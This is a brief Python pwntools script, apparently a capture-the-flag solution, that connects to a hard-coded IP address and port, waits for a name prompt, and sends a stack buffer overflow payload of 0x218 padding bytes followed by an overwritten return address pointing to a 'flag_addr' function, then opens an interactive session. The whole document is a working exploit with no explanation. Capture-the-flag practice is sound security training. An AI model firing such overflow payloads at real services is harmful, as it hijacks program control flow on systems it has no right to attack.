from pwn import *

conn=remote("120.26.131.152","9877")
conn.recvuntil("name?");
flag_addr=0x400d20                                                                                                 
payload=b'a'*0x218+p64(flag_addr)
conn.sendline(payload)
conn.interactive()
